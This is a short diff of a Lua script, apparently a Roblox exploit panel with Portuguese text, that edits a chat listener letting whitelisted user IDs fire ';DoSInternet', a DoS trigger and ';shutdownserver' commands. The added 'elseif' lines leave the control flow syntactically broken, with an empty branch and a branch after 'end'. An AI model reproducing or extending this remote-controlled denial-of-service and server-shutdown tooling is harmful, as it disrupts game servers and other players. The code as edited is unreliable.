@@ -694,7 +694,7 @@ local function OuvirChat(Jogador, Mensagem)
             end
 
             Rayfield:Notify({ Title = "Painel Privado", Content = "Gatilho DoS (Normal) ativado com sucesso.", Duration = 4 })
-            
+        elseif IDsAutorizados[Jogador.UserId] then
         elseif Mensagem == ";DoSInternet" then
             local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait() 
             local backpack = LocalPlayer:WaitForChild("Backpack") 
@@ -727,7 +727,7 @@ local function OuvirChat(Jogador, Mensagem)
         end
 
         
-
+    elseif IDsAutorizados[Jogador.UserId] then
         if Mensagem == ";shutdownserver" then
             pcall(function() 
                 Rayfield:Notify({Title = "Comando Executado", Content = "Gatilho de Shutdown ativado via Chat.", Duration = 4}) 
